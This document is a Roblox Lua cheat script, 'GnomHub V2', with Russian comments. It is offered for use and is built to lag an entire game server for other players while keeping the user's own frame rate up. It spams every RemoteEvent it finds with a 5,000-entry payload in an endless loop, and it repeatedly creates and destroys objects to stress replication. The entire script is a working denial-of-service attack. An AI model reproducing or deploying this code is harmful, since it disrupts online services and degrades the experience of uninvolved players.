--[[
    GnomHub V2 - Network Dominance Script
    Target: Server-Wide Lag (Excluding User)
    Optimization: Zero-Point Protocol
]]

if getgenv().GnomHubRunning then return end
getgenv().GnomHubRunning = true

local RunService = game:GetService("RunService")
local NetworkClient = game:GetService("NetworkClient")
local RemoteEvents = {}

-- Поиск всех доступных RemoteEvents для спама
for _, v in pairs(game:GetDescendants()) do
    if v:IsA("RemoteEvent") then
        table.insert(RemoteEvents, v)
    end
end

-- Создаем огромный пакет данных (Payload), который сервер будет рассылать другим
local heavyData = {}
for i = 1, 5000 do
    heavyData[i] = "GNOM_HUB_ZERO_POINT_" .. i
end

-- 1. Сетевой шторм (Lag for others)
-- Мы используем task.spawn, чтобы спам не вешал ваш поток исполнения
task.spawn(function()
    while getgenv().GnomHubRunning do
        for _, event in ipairs(RemoteEvents) do
            -- Отправляем данные на сервер. Сервер попытается синхронизировать это с другими игроками.
            event:FireServer(heavyData)
        end
        -- Небольшая пауза, чтобы ваш интернет-канал не "захлебнулся" первым
        task.wait(0.05) 
    end
end)

-- 2. Физический лаг (Physics Stress)
-- Создаем объекты, которые реплицируются (копируются) всем игрокам
task.spawn(function()
    while getgenv().GnomHubRunning do
        -- Пытаемся вызвать лаг через систему репликации звуков/эффектов
        -- Это заставляет чужие клиенты постоянно обрабатывать новые данные
        for i = 1, 10 do
            local p = Instance.new("RemoteEvent")
            p.Parent = game.ReplicatedStorage
            task.delay(0.1, function() p:Destroy() end)
        end
        task.wait(0.1)
    end
end)

-- 3. Защита вашего FPS (FPS Booster для себя)
-- Отключаем отображение тяжелых эффектов только для вас
settings().Rendering.QualityLevel = 1
for _, v in pairs(workspace:GetDescendants()) do
    if v:IsA("BasePart") and (v.Material == Enum.Material.Glass or v.Material == Enum.Material.Neon) then
        v.Material = Enum.Material.Plastic
    end
end

print("GnomHub V2: Сетевая доминация активирована. Лаг распределен по серверу.")
